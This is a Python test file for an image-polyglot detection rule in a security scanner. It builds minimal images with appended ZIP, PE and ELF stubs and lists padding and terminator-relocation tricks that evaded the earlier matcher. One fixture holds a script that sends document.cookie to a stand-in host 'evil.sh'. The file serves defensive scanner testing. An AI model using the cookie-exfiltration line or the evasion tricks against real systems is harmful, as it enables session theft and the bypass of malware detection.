"""FN twins for T1 — MEDUSA-IMG-POLYGLOT-001 must find an APPENDED FILE anywhere
in the trailer, not only at byte 0 of a fixed 4 KB window.

The control was anchored (`trailer[:4096].lstrip(b"\\x00\\r\\n\\t ")` then
`re.match`) to kill an FP: a bare 2-byte `MZ` inside compressed image data made
AdvBox's `demo_advbox.png` a CRITICAL "PE/DOS executable". The anchoring bought
that precision with a one-byte evasion:

    PNG + <real ZIP>          flagged   (control)
    PNG + \\x01     + <ZIP>    MISSED    any byte outside the 5-char strip set
    PNG + 'A'*5000 + <ZIP>    MISSED    moves the magic off offset 0
    PNG + NUL*5000 + <ZIP>    MISSED    payload sits past the 4096-byte window
    PNG + <PE> + b"IEND"      MISSED    rfind() relocates the terminator past it

The padding costs the attacker nothing — the file is still a valid archive. So
these twins pin the FN direction, and the second half pins the precision that
must survive the fix: chance `MZ` / `PK\\x03\\x04` / `eval(` inside binary image
data is NOT an appended file.
"""
import io
import random
import struct
import zipfile
import zlib
from pathlib import Path

from medusa.scanners.image_embedded_threat_scanner import ImageEmbeddedThreatScanner

RULE = "MEDUSA-IMG-POLYGLOT-001"


# --- container builders (all minimal but STRUCTURALLY VALID) ---------------- #
def _chunk(ctype: bytes, body: bytes) -> bytes:
    return (struct.pack(">I", len(body)) + ctype + body
            + struct.pack(">I", zlib.crc32(ctype + body) & 0xFFFFFFFF))


def _png(trailer: bytes = b"") -> bytes:
    return (b"\x89PNG\r\n\x1a\n"
            + _chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
            + _chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
            + _chunk(b"IEND", b"") + trailer)


def _jpeg(trailer: bytes = b"") -> bytes:
    """A well-formed baseline JPEG: SOI/DQT/SOF0/DHT/SOS/entropy/EOI."""
    dqt = b"\xff\xdb" + struct.pack(">H", 67) + b"\x00" + bytes(range(1, 65))
    sof = (b"\xff\xc0" + struct.pack(">H", 11) + b"\x08"
           + struct.pack(">HH", 1, 1) + b"\x01\x01\x11\x00")
    dht = (b"\xff\xc4" + struct.pack(">H", 20) + b"\x00"
           + bytes([1] + [0] * 15) + b"\x00")
    sos = b"\xff\xda" + struct.pack(">H", 8) + b"\x01\x01\x00\x00\x3f\x00"
    scan = b"\x12\x34\x56\xff\x00\x78"          # \xff\x00 = a stuffed FF byte
    return b"\xff\xd8" + dqt + sof + dht + sos + scan + b"\xff\xd9" + trailer


def _gif(trailer: bytes = b"") -> bytes:
    return (b"GIF89a" + struct.pack("<HH", 1, 1) + b"\x00\x00\x00"
            + b"\x2c" + struct.pack("<HHHH", 0, 0, 1, 1) + b"\x00"
            + b"\x02" + b"\x02\x44\x01" + b"\x00" + b"\x3b" + trailer)


def _webp(trailer: bytes = b"") -> bytes:
    body = b"WEBP" + b"VP8L" + struct.pack("<I", 4) + b"\x2f\x00\x00\x00"
    return b"RIFF" + struct.pack("<I", len(body)) + body + trailer


def _bmp(trailer: bytes = b"") -> bytes:
    pixels = b"\x00\x00\xff\x00"
    dib = struct.pack("<IiiHHIIiiII", 40, 1, 1, 1, 24, 0, len(pixels),
                      2835, 2835, 0, 0)
    size = 14 + len(dib) + len(pixels)
    return (b"BM" + struct.pack("<IHHI", size, 0, 0, 14 + len(dib))
            + dib + pixels + trailer)


# --- payload builders ------------------------------------------------------- #
def _real_zip(name: str = "data.txt") -> bytes:
    """A genuine deflated ZIP — EOCD, central directory and local header all
    present and self-consistent, exactly what an attacker appends."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(name, "payload" * 64)
    return buf.getvalue()


def _real_pe() -> bytes:
    """A minimal PE: DOS header whose e_lfanew (0x3C) points at `PE\\0\\0`."""
    dos = bytearray(b"\x00" * 0x40)
    dos[0:2] = b"MZ"
    dos[0x3c:0x40] = struct.pack("<I", 0x40)
    coff = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0, 0x0022)
    return bytes(dos) + coff + b"\x00" * 32


def _noise(n: int, seed: int) -> bytes:
    """Deterministic high-entropy bytes — a stand-in for compressed image data."""
    return random.Random(seed).randbytes(n)


# --- harness ---------------------------------------------------------------- #
def _ids(tmp_path: Path, name: str, blob: bytes):
    p = tmp_path / name
    p.write_bytes(blob)
    return [i.rule_id for i in ImageEmbeddedThreatScanner().scan_file(p).issues]


# =========================================================================== #
# FN twins — every one of these is a valid appended archive/executable
# =========================================================================== #
def test_control_png_plus_real_zip_is_flagged(tmp_path):
    """Control: the un-padded case the anchored matcher already caught."""
    assert RULE in _ids(tmp_path, "a.png", _png(_real_zip()))


def test_png_one_byte_pad_then_zip_is_flagged(tmp_path):
    """One byte outside the 5-char strip set moved the magic off offset 0."""
    assert RULE in _ids(tmp_path, "b.png", _png(b"\x01" + _real_zip()))


def test_png_ascii_pad_then_zip_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "c.png", _png(b"A" * 5000 + _real_zip()))


def test_png_nul_pad_beyond_window_then_zip_is_flagged(tmp_path):
    """NULs are stripped, but only inside the 4096-byte window that was read."""
    assert RULE in _ids(tmp_path, "d.png", _png(b"\x00" * 5000 + _real_zip()))


def test_png_one_byte_pad_then_pe_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "e.png", _png(b"\x01" + _real_pe()))


def test_png_pad_then_elf_is_flagged(tmp_path):
    elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 120
    assert RULE in _ids(tmp_path, "f.png", _png(b"\x01" + elf))


def test_jpeg_one_byte_pad_then_zip_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "g.jpg", _jpeg(b"\x01" + _real_zip()))


def test_jpeg_nul_pad_then_html_beyond_window_is_flagged(tmp_path):
    """The appended-TEXT path was capped at the same 4096 bytes."""
    html = b"<html><script>fetch('//evil.sh/'+document.cookie)</script></html>"
    assert RULE in _ids(tmp_path, "h.jpg", _jpeg(b"\x00" * 5000 + html))


def test_gif_one_byte_pad_then_zip_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "i.gif", _gif(b"\x01" + _real_zip()))


def test_png_terminator_relocated_by_iend_in_payload_is_flagged(tmp_path):
    """`rfind(b"IEND")` lets the payload carry its own terminator bytes and push
    the boundary past itself — a second one-line evasion of the same control."""
    assert RULE in _ids(tmp_path, "j.png", _png(_real_pe() + b"IEND"))


def test_jpeg_terminator_relocated_by_eoi_in_payload_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "k.jpg", _jpeg(_real_pe() + b"\xff\xd9"))


def test_webp_with_appended_zip_is_flagged(tmp_path):
    """WebP has an exact RIFF size field — it had no terminator handling at all,
    so 100% of appended payloads were missed."""
    assert RULE in _ids(tmp_path, "l.webp", _webp(_real_zip()))


def test_bmp_with_appended_zip_is_flagged(tmp_path):
    assert RULE in _ids(tmp_path, "m.bmp", _bmp(_real_zip()))


# =========================================================================== #
# Precision twins — must stay clean BEFORE and AFTER the fix
# =========================================================================== #
def test_benign_png_no_trailer_is_clean(tmp_path):
    assert RULE not in _ids(tmp_path, "n.png", _png())


def test_benign_jpeg_no_trailer_is_clean(tmp_path):
    assert RULE not in _ids(tmp_path, "o.jpg", _jpeg())


def test_benign_gif_no_trailer_is_clean(tmp_path):
    assert RULE not in _ids(tmp_path, "p.gif", _gif())


def test_benign_webp_is_clean(tmp_path):
    assert RULE not in _ids(tmp_path, "q.webp", _webp())


def test_benign_bmp_is_clean(tmp_path):
    assert RULE not in _ids(tmp_path, "r.bmp", _bmp())


def test_advbox_style_chance_mz_in_image_trailer_is_clean(tmp_path):
    """The FP this control was anchored for: `demo_advbox.png` is a JPEG header
    with ~100 KB of PNG image data concatenated after it. A bare `MZ` appears by
    chance in ~79% of 100 KB spans of compressed data — it is not a PE."""
    noise = _noise(100_000, seed=20260806)
    trailer = noise[:40_000] + b"MZ" + noise[40_000:]
    assert b"PE\x00\x00" not in trailer, "fixture must carry no NT signature"
    blob = _jpeg(trailer)
    assert RULE not in _ids(tmp_path, "s.jpg", blob)


def test_chance_zip_local_header_without_structure_is_clean(tmp_path):
    """`PK\\x03\\x04` inside compressed data, with no EOCD and an incoherent
    local file header, is a coincidence — not an appended archive."""
    noise = _noise(60_000, seed=1337)
    trailer = noise[:20_000] + b"PK\x03\x04" + noise[20_000:]
    assert b"PK\x05\x06" not in trailer, "fixture must carry no EOCD"
    assert RULE not in _ids(tmp_path, "t.png", _png(trailer))


def test_chance_eval_in_binary_trailer_is_clean(tmp_path):
    """Short ASCII signatures only mean something in a region that is text."""
    noise = _noise(60_000, seed=99)
    trailer = noise[:30_000] + b"eval(" + noise[30_000:]
    assert RULE not in _ids(tmp_path, "u.png", _png(trailer))


def test_chance_shebang_in_binary_trailer_is_clean(tmp_path):
    """`#!/bin/sh` planted mid-binary is not a script payload."""
    noise = _noise(60_000, seed=7)
    trailer = noise[:30_000] + b"#!/bin/sh" + noise[30_000:]
    assert RULE not in _ids(tmp_path, "v.png", _png(trailer))
